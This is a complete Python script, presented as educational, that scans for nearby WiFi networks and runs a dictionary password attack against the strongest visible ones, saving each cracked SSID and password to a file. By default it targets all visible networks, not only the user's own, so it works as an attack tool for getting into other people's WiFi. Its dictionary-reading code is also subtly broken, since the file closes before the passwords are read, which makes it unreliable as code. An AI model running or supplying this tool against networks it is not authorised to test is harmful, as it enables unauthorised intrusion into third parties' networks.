#!/usr/bin/env python3
"""
WiFi Password Brute‑Forcer (Educational Use Only)

This module scans for available WiFi networks and attempts to connect using
a dictionary of passwords. It is intended for testing your own network
security or recovering a forgotten password on a trusted network.

Security:
- NEVER prints passwords to the console.
- Successfully found passwords are written to a file (optional).
- All sensitive operations use secure file handling and minimal exposure.

Requirements:
    Python 3.6+, pywifi (Windows only)
"""

import time
import argparse
import sys
from typing import List, Optional, Set

import pywifi
from pywifi import const


def parse_arguments() -> argparse.Namespace:
    """Parse command‑line arguments."""
    parser = argparse.ArgumentParser(
        description="Brute‑force WiFi passwords using a dictionary."
    )
    parser.add_argument(
        "--dict",
        required=True,
        help="Path to the password dictionary file (one password per line)."
    )
    parser.add_argument(
        "--max",
        type=int,
        default=5,
        help="Maximum number of visible WiFi networks to attempt (default: 5)."
    )
    parser.add_argument(
        "--exclude",
        nargs="*",
        default=[],
        help="List of SSIDs to exclude from cracking (e.g., --exclude HomeNet Office)."
    )
    parser.add_argument(
        "--output",
        default="found.txt",
        help="File to store successfully found passwords (default: found.txt)."
    )
    return parser.parse_args()


def get_wifi_interfaces() -> Optional[pywifi.Interface]:
    """
    Return the first available WiFi interface.

    Returns:
        pywifi.Interface object or None if no interface is found.
    """
    wifi = pywifi.PyWiFi()
    interfaces = wifi.interfaces()
    if not interfaces:
        print("❌ No WiFi interface found.")
        return None
    return interfaces[0]


def scan_networks(iface: pywifi.Interface, max_networks: int,
                  exclude: Set[str]) -> List[str]:
    """
    Scan for visible WiFi networks and return a list of SSIDs (filtered).

    Args:
        iface: WiFi interface.
        max_networks: Maximum number of networks to return (by signal strength).
        exclude: Set of SSIDs to skip.

    Returns:
        List of SSIDs (up to max_networks) sorted by signal strength.
    """
    print("🔍 Scanning for WiFi networks...")
    iface.scan()
    time.sleep(8)  # Allow scan to complete

    scan_results = iface.scan_results()
    # Collect unique SSIDs with their signal strength
    ssid_signal = {}
    for net in scan_results:
        ssid = net.ssid
        if ssid and ssid not in exclude:
            # Keep the strongest signal for duplicates
            if ssid not in ssid_signal or net.signal > ssid_signal[ssid]:
                ssid_signal[ssid] = net.signal

    # Sort by signal strength descending
    sorted_networks = sorted(ssid_signal.items(), key=lambda x: x[1], reverse=True)
    # Return only the top `max_networks` SSIDs
    return [ssid for ssid, _ in sorted_networks[:max_networks]]


def disconnect_iface(iface: pywifi.Interface) -> None:
    """Disconnect the interface from any existing connection."""
    iface.disconnect()
    time.sleep(1)


def test_password(iface: pywifi.Interface, ssid: str, password: str) -> bool:
    """
    Attempt to connect to a WiFi network with a given password.

    Args:
        iface: WiFi interface.
        ssid: Network SSID.
        password: Password to test.

    Returns:
        True if connection successful, False otherwise.
    """
    # Build a profile
    profile = pywifi.Profile()
    profile.ssid = ssid
    profile.auth = const.AUTH_ALG_OPEN
    profile.akm.append(const.AKM_TYPE_WPA2PSK)  # Most common
    profile.cipher = const.CIPHER_TYPE_CCMP
    profile.key = password

    # Remove any previous profiles and add this one
    iface.remove_all_network_profiles()
    tmp_profile = iface.add_network_profile(profile)

    # Connect
    iface.connect(tmp_profile)
    time.sleep(5)  # Wait for connection attempt

    # Check connection status
    return iface.status() == const.IFACE_CONNECTED


def brute_force(iface: pywifi.Interface, ssid_list: List[str],
                dict_path: str, output_file: str) -> None:
    """
    Iterate through passwords and try each SSID until one succeeds.

    Args:
        iface: WiFi interface.
        ssid_list: List of SSIDs to try.
        dict_path: Path to password dictionary.
        output_file: File to write successful passwords to.
    """
    if not ssid_list:
        print("⚠️  No networks to test. Exiting.")
        return

    try:
        with open(dict_path, "r", encoding="utf-8") as f:
            passwords = (line.strip() for line in f if line.strip())
    except FileNotFoundError:
        print(f"❌ Dictionary file '{dict_path}' not found.")
        sys.exit(1)
    except Exception as e:
        print(f"❌ Error reading dictionary: {e}")
        sys.exit(1)

    found = {}
    total_attempts = 0
    remaining = set(ssid_list)  # Copy to avoid modifying original

    for pwd in passwords:
        if not remaining:
            break
        total_attempts += 1
        # Print progress without exposing the password
        print(f"🔄 Attempt {total_attempts}...", end=" ", flush=True)

        # Try the current password on all remaining SSIDs
        for ssid in list(remaining):  # Iterate over a copy
            if test_password(iface, ssid, pwd):
                found[ssid] = pwd
                remaining.remove(ssid)
                print(f"✅ Found password for '{ssid}'")
                # Write immediately to file
                try:
                    with open(output_file, "a", encoding="utf-8") as out:
                        out.write(f"{ssid}:{pwd}\n")
                except Exception as e:
                    print(f"⚠️  Could not write to output file: {e}")
            else:
                # Disconnect to clean up before next attempt
                disconnect_iface(iface)

        # Small delay between attempts (optional)
        time.sleep(0.5)

    if found:
        print(f"\n🎉 Successfully cracked {len(found)} network(s). "
              f"Passwords saved to '{output_file}'.")
    else:
        print("\n❌ No passwords matched any network.")


def main() -> None:
    """Main entry point."""
    args = parse_arguments()

    # Get WiFi interface
    iface = get_wifi_interfaces()
    if iface is None:
        sys.exit(1)

    # Disconnect any active connection
    disconnect_iface(iface)

    # Scan for networks
    exclude_set = set(args.exclude)
    ssid_list = scan_networks(iface, args.max, exclude_set)
    if not ssid_list:
        print("ℹ️  No visible WiFi networks found (or all excluded).")
        sys.exit(0)

    print(f"📡 Found {len(ssid_list)} network(s): {', '.join(ssid_list)}")

    # Start brute‑forcing
    brute_force(iface, ssid_list, args.dict, args.output)


if __name__ == "__main__":
    main()